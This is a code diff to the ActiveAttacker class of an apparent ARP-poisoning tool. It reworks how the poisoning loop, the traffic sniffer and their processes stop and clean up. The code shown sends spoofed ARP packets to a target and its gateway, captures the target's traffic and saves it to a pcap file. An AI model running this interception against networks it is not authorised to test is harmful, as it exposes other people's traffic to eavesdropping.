@@ -95,12 +95,12 @@ class ActiveAttacker:
         print('-' * 30)
         print('Beginning the ARP poison. [CTRL-C to stop]')
 
-        while not event.wait(0):
+        while not event.is_set():
             sys.stdout.write('.')
             sys.stdout.flush()
             sendp(poison_target)
             sendp(poison_gateway)
-            sleep(arper.delay)
+            event.wait(arper.delay)
         self.restore(arper)
 
     def sniff_and_store(self, arper: Arper):
@@ -108,7 +108,7 @@ class ActiveAttacker:
         bpf_filter = f'host {arper.target} and not arp'
         signal.signal(signal.SIGINT, signal.SIG_DFL)
         packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)    # The sniff function can handle KeyboardInterrupt
-        if len(packets) == 0:
+        if arper.poison_event.is_set():
             print('Aborted')
         arper.poison_event.set()
         wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
@@ -146,21 +146,25 @@ class ActiveAttacker:
                 count=5)
     
     def start(self, arper:Arper):
+        poison_process = None
         try:
             arper.sniff_process = Process(target=self.sniff_and_store, args=[arper])
             arper.sniff_process.start()
             sleep(1)
             poison_process = Process(target=self.poison, args=[arper, arper.poison_event])
             poison_process.start()
-        except KeyboardInterrupt:
+            arper.sniff_process.join()
+        except (KeyboardInterrupt, Exception) as e:
+            if isinstance(e, KeyboardInterrupt):
+                print('Aborted')
             arper.poison_event.set()
         finally:
+            arper.poison_event.set()
             if arper.sniff_process.is_alive():
-                arper.sniff_process.join()
-            try:
-                poison_process.join()
-            except:
-                pass
+                arper.sniff_process.terminate()
+            if poison_process and poison_process.is_alive():
+                poison_process.terminate()
+            
 
 class PassiveAttacker:
 
